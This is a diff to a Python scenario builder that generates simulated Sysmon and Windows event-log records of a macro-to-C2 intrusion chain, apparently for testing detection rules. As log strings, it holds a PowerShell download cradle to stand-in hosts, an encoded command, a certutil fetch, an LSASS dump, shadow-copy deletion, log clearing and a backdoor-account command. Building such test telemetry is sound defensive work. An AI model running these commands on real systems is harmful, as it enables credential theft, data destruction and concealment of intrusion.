@@ -1,11 +1,12 @@
 """storyline_endpoint_macro_c2 -- a malicious Word macro on one workstation, followed down its Sysmon
-process tree: Outlook -> Word -> PowerShell, then a script-block cradle, an LSASS memory read by a
-dropped dumper, a service installed for the dropped implant, the implant's periodic C2 beacon, and
-finally the Security log cleared.
+process tree as a real SPAWN CHAIN: every alert-raising process is created by the previous stage's
+alert-raising process.
 
 Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).
 
-    macro_shell -> ps_cradle -> lsass_read -> service_persistence -> c2_beacon -> log_clear
+    macro_shell -> ps_encoded -> {tool_download, lsass_read, service_persistence, log_clear}
+                                  log_clear -> {shadow_delete, sched_task, account_add}
+    (plus two steps whose alert is not a process creation: ps_cradle (4104) and c2_beacon (EID 3))
 
 WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7)
     * every step raises an alert on its own rule, so each oracle pair has a timed alert on both sides
@@ -13,23 +14,34 @@ WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7)
       entity track joins in both directions, so they reach distinct timed edges of one graph (F4);
     * the Sysmon records carry REAL process-tree keys written by this builder's own generator
       (``sysmon_tree``): EID 1 ``ProcessGuid`` / ``ParentProcessGuid``, EID 3 ``ProcessGuid``, EID 10
-      ``SourceProcessGUID``. The oracle's ``causal_links`` are derived from those raw records by
-      ``sysmon_tree.derive_links`` (no parser, rule, alert or service code), and the test pins them.
+      ``SourceProcessGUID``. The builder MARKS each step's alert-raising record (``trigger=True``) and the
+      oracle's ``causal_links`` are derived from the raw records by ``sysmon_tree.derive_links``: step B
+      is linked from step A only when B's trigger is a Sysmon EID 1 whose ParentProcessGuid is A's trigger
+      ProcessGuid. No parser, rule, alert or service code is read, and the test pins the oracle to it.
 
-PROCESS TREE (one workstation; ``P`` = the PowerShell the macro starts)
+PROCESS TREE (one workstation; every node marked ``[rule]`` is a step's trigger and raises an alert)
 
-        explorer -> outlook -> winword -> P ----+--> whoami                  (step ps_cradle)
-                                                +--> procdump  --EID10--> lsass   (step lsass_read)
-                                                +--> sc.exe / updater.exe    (step service_persistence)
-                                                |        updater.exe --EID3 x N--> C2  (step c2_beacon)
-                                                +--> wevtutil                (step log_clear)
+    explorer -> OUTLOOK -> WINWORD -> cmd.exe [office-spawn]                   (step macro_shell)
+                                       |
+                                       +--> powershell -enc [encoded-cmd]       (step ps_encoded)  = P
+                                              +--> recon children (whoami ...)  (helper records of ps_cradle)
+                                              +--> certutil -urlcache [certutil] (step tool_download)
+                                              +--> dumper -ma lsass [lsass-dump] --EID10--> lsass (lsass_read)
+                                              +--> sc.exe create [service]       (step service_persistence)
+                                              +--> implant --EID3 x N--> C2      (step c2_beacon, not linkable)
+                                              +--> powershell Clear-EventLog [log-clear]  (step log_clear) = Q
+                                                     +--> vssadmin delete shadows        (step shadow_delete)
+                                                     +--> schtasks /create               (step sched_task)
+                                                     +--> net user /add                  (step account_add)
 
-TELEMETRY. Real parsers: ``sysmon`` (EID 1, 3, 10) and ``windows_eventlog`` (4104, 7045, 1102). No
-dependency gaps (``parse_expected=True`` everywhere). A step may mix the two sources: its helper
-process-creation records are Sysmon, its alert-raising record is whichever source the step names.
+    8 trigger-to-trigger spawn links. ps_cradle (4104), the 7045 / 1102 records and the beacon are Windows-log /
+    EID 3 alerts: they raise alerts but carry no parent key, so they are incident realism, never link endpoints.
 
-STRUCTURE VARIES WITH THE SEED: account, workstation, addresses, number of script-block events (1-3),
-number of beacon connections (20-24), the dropped tool names and the C2 address.
+TELEMETRY. Real parsers: ``sysmon`` (EID 1, 3, 10) and ``windows_eventlog`` (4104, 7045, 1102). No dependency
+gaps (``parse_expected=True`` everywhere).
+
+STRUCTURE VARIES WITH THE SEED: account, workstation, addresses, number of script-block events (1-3), number of
+beacon connections (20-24), the dropped tool names and the C2 address.
 
 SAFETY. Simulation only: ``.invalid`` / documentation addresses, private 10.0.0.0/8 source addresses, a
 fixed calendar epoch, no wall clock. Command lines are strings inside log records; nothing runs.
@@ -52,17 +64,27 @@ TAG = "emc"
 
 STEPS: tuple[ChainStepSpec, ...] = (
     ChainStepSpec("macro_shell", "sysmon", True,
-                  "Outlook opens a document; Word's macro starts a PowerShell (document host spawns a shell)"),
+                  "Outlook opens a document; Word's macro starts a command shell (document host spawns a shell)"),
+    ChainStepSpec("ps_encoded", "sysmon", True,
+                  "the shell starts a PowerShell with an encoded command"),
     ChainStepSpec("ps_cradle", "windows_eventlog", True,
                   "script-block logging records a download-and-execute cradle in that PowerShell"),
+    ChainStepSpec("tool_download", "sysmon", True,
+                  "the PowerShell fetches the next-stage tool with certutil"),
     ChainStepSpec("lsass_read", "sysmon", True,
-                  "a dropped dumper started by the PowerShell opens lsass.exe with a memory-read mask"),
-    ChainStepSpec("service_persistence", "windows_eventlog", True,
-                  "a service is installed for the dropped implant from a user-writable path"),
+                  "a dumper started by the PowerShell opens lsass.exe with a memory-read mask"),
+    ChainStepSpec("service_persistence", "sysmon", True,
+                  "a service is created for the dropped implant (sc.exe create, then Event 7045)"),
     ChainStepSpec("c2_beacon", "sysmon", True,
                   "the implant process makes regular-interval outbound connections"),
-    ChainStepSpec("log_clear", "windows_eventlog", True,
-                  "the Security event log is cleared"),
+    ChainStepSpec("log_clear", "sysmon", True,
+                  "a second PowerShell clears the Security event log (Clear-EventLog, then Event 1102)"),
+    ChainStepSpec("shadow_delete", "sysmon", True,
+                  "that PowerShell deletes the volume shadow copies"),
+    ChainStepSpec("sched_task", "sysmon", True,
+                  "that PowerShell registers a scheduled task for the implant"),
+    ChainStepSpec("account_add", "sysmon", True,
+                  "that PowerShell adds a local backdoor account"),
 )
 DECOY_STEPS: tuple[ChainStepSpec, ...] = (
     ChainStepSpec("decoy_deploy_script", "windows_eventlog", True,
@@ -74,12 +96,15 @@ _WKS = ("wks-fin-21", "wks-sal-08", "wks-leg-12", "wks-pro-30")
 _DROPPERS = ("procdump64.exe", "sqldmp.exe", "taskhelp.exe")
 _IMPLANTS = ("updater.exe", "msedgeupd.exe", "vmtoolsd32.exe")
 _C2 = ("198.51.100.23", "203.0.113.77", "198.51.100.140")
+_BACKDOOR = ("svc_backup", "svc_sqlagent", "svc_print")
 _CRADLES = (
     "IEX (New-Object Net.WebClient).DownloadString('http://stage.example.invalid/a.ps1')",
     "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://x.example.invalid/p'))",
 )
+_ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
 _PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
 _SYS = "C:\\Windows\\System32\\"
+_PS = _SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
 _OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
 
 
@@ -99,6 +124,7 @@ def build(seed: int):
     implant_name = rng.choice(_IMPLANTS)
     c2 = rng.choice(_C2)
     cradle = rng.choice(_CRADLES)
+    ghost = rng.choice(_BACKDOOR)
     n_ps = 1 + seed % 3                       # 1..3 script-block events
     n_beats = 20 + seed % 5                   # 20..24 beacon connections (rule threshold is 20)
     svc_name = f"UpdSvc{rng.randint(10, 99)}"
@@ -109,33 +135,49 @@ def build(seed: int):
     em = Emitter(seed, TAG, STEPS)
     notes: dict = {}
 
-    def add(label: str, source_type: str, raw: dict, ts: int) -> None:
-        em.add(label, source_type, raw, ts, ip)
+    def add(label: str, source_type: str, raw: dict, ts: int, trigger: bool = False) -> None:
+        em.add(label, source_type, raw, ts, ip, trigger=trigger)
+
+    def spawn(label: str, p, trigger: bool = True) -> None:
+        add(label, "sysmon", p.create_record(), p.start_ms, trigger)
 
     t0 = BASE_MS
     # ---- process tree (the builder decides the processes; every record below is derived from it) ----
     explorer = host.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
     outlook = host.proc(_OFFICE + "OUTLOOK.EXE", "\"OUTLOOK.EXE\"", user, t0, explorer)
     word = host.proc(_OFFICE + "WINWORD.EXE", "\"WINWORD.EXE\" /n C:\\Users\\Public\\Invoice.docm", user, t0 + 4_000, outlook)
-    ps = host.proc(_SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -nop -w hidden", user, t0 + 9_000, word)
-    recon = [host.proc(_SYS + exe, cmd, user, t0 + 16_000 + i * 1_000, ps) for i, (exe, cmd) in enumerate((
+    cmd = host.proc(_SYS + "cmd.exe", "cmd.exe /c start /min powershell", user, t0 + 9_000, word)
+    ps = host.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC}", user, t0 + 14_000, cmd)
+    recon = [host.proc(_SYS + exe, c, user, t0 + 18_000 + i * 1_000, ps) for i, (exe, c) in enumerate((
         ("whoami.exe", "whoami /all"), ("hostname.exe", "hostname"), ("ipconfig.exe", "ipconfig /all"),
         ("net.exe", "net user /domain")))]
     t_ps = t0 + 30_000
-    dumper = host.proc(dropper_path, f"{dropper} -ma lsass.exe", user, t_ps + 60_000, ps)
+    certutil = host.proc(_SYS + "certutil.exe",
+                         f"certutil.exe -urlcache -split -f http://stage.example.invalid/{implant_name} {implant_path}",
+                         user, t0 + 60_000, ps)
+    dumper = host.proc(dropper_path, f"{dropper} -ma lsass.exe", user, t0 + 90_000, ps)
     lsass = host.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
-    sc = host.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {implant_path}", user, t_ps + 200_000, ps)
-    implant = host.proc(implant_path, implant_path, user, t_ps + 215_000, ps)
-    wevt = host.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t_ps + 880_000, ps)
+    sc = host.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {implant_path}", user, t0 + 130_000, ps)
+    implant = host.proc(implant_path, implant_path, user, t0 + 145_000, ps)
+    clear = host.proc(_PS, "powershell.exe -nop -w hidden -c \"Clear-EventLog -LogName Security\"", user, t0 + 800_000, ps)
+    vss = host.proc(_SYS + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", user, t0 + 820_000, clear)
+    schtask = host.proc(_SYS + "schtasks.exe",
+                        f"schtasks.exe /create /tn {svc_name} /tr {implant_path} /sc onlogon", user, t0 + 840_000, clear)
+    acct = host.proc(_SYS + "net.exe", f"net.exe user {ghost} Passw0rd! /add", user, t0 + 860_000, clear)
 
-    # ---- step macro_shell: Outlook -> Word -> PowerShell; only the last creation raises the alert ----
-    for p in (explorer, outlook, word, ps):
-        add("macro_shell", "sysmon", p.create_record(), p.start_ms)
-    notes["macro_shell"] = f"{user} on {wks}: OUTLOOK -> WINWORD -> powershell.exe"
+    # ---- step macro_shell: Outlook -> Word -> cmd; only the cmd creation raises the alert ----
+    for p in (explorer, outlook, word):
+        spawn("macro_shell", p, trigger=False)
+    spawn("macro_shell", cmd)
+    notes["macro_shell"] = f"{user} on {wks}: OUTLOOK -> WINWORD -> cmd.exe"
+
+    # ---- step ps_encoded ----
+    spawn("ps_encoded", ps)
+    notes["ps_encoded"] = f"cmd.exe starts powershell.exe -enc on {wks}"
 
     # ---- step ps_cradle: four recon children of the PowerShell, then the script-block events ----
     for p in recon:
-        add("ps_cradle", "sysmon", p.create_record(), p.start_ms)
+        spawn("ps_cradle", p, trigger=False)
     for i in range(n_ps):
         ts = t_ps + i * 15_000
         add("ps_cradle", "windows_eventlog",
@@ -144,15 +186,19 @@ def build(seed: int):
              "ScriptBlockText": cradle, "TimeCreated": ts}, ts)
     notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks}: {cradle[:44]}..."
 
+    # ---- step tool_download ----
+    spawn("tool_download", certutil)
+    notes["tool_download"] = f"certutil -urlcache fetches {implant_name}"
+
     # ---- step lsass_read: the PowerShell drops a dumper, the dumper reads lsass ----
-    add("lsass_read", "sysmon", dumper.create_record(), dumper.start_ms)
+    spawn("lsass_read", dumper)
     t_acc = dumper.start_ms + 5_000
     add("lsass_read", "sysmon", dumper.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
     notes["lsass_read"] = f"{dropper_path} opens lsass.exe with GrantedAccess 0x1010"
 
     # ---- step service_persistence: sc.exe registers the dropped implant, which the PowerShell also starts ----
-    add("service_persistence", "sysmon", sc.create_record(), sc.start_ms)
-    add("service_persistence", "sysmon", implant.create_record(), implant.start_ms)
+    spawn("service_persistence", sc)
+    spawn("service_persistence", implant, trigger=False)
     t_svc = sc.start_ms + 5_000
     add("service_persistence", "windows_eventlog",
         {"EventID": 7045, "Channel": "System", "ProviderName": "Service Control Manager",
@@ -164,17 +210,25 @@ def build(seed: int):
     t_b = implant.start_ms + 60_000
     for i in range(n_beats):
         ts = t_b + i * 15_000 + (rng.randint(-500, 500) if i else 0)
-        add("c2_beacon", "sysmon", implant.connect_record(ts, c2, 443, 49_200 + i), ts)
+        add("c2_beacon", "sysmon", implant.connect_record(ts, c2, 443, 49_200 + i), ts, trigger=(i == 19))
     notes["c2_beacon"] = f"{n_beats} connections from {implant_name} to {c2}:443 every ~15 s"
 
-    # ---- step log_clear ----
-    add("log_clear", "sysmon", wevt.create_record(), wevt.start_ms)
-    t_clr = wevt.start_ms + 3_000
+    # ---- step log_clear: a second PowerShell clears the Security log ----
+    spawn("log_clear", clear)
+    t_clr = clear.start_ms + 3_000
     add("log_clear", "windows_eventlog",
         {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
          "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
          "TimeCreated": t_clr}, t_clr)
     notes["log_clear"] = f"{user} clears the Security log on {wks}"
+
+    # ---- the clearing PowerShell's children ----
+    spawn("shadow_delete", vss)
+    notes["shadow_delete"] = "vssadmin delete shadows /all /quiet"
+    spawn("sched_task", schtask)
+    notes["sched_task"] = f"schtasks /create {svc_name} -> {implant_name} at logon"
+    spawn("account_add", acct)
+    notes["account_add"] = f"net user {ghost} /add on {wks}"
     return em.payloads, {}, notes, None
 
 
@@ -197,8 +251,9 @@ STORYLINE = ScenarioDef(
     steps=STEPS,
     build=build,
     oracle_path=TWIN / "oracle_endpoint_macro_c2.yaml",
-    summary="Outlook -> Word -> PowerShell on one workstation (Sysmon process tree), cradle, LSASS read by a "
-            "dropped dumper, service for the implant, regular C2 beacon, Security log cleared",
+    summary="Outlook -> Word -> cmd -> PowerShell on one workstation as a spawn chain (Sysmon process tree): "
+            "encoded command, certutil download, LSASS dump, service, beacon, event-log clear, then shadow-copy "
+            "delete, scheduled task and backdoor account from the clearing PowerShell",
     decoy=_build_decoys,
     decoy_steps=DECOY_STEPS,
 )
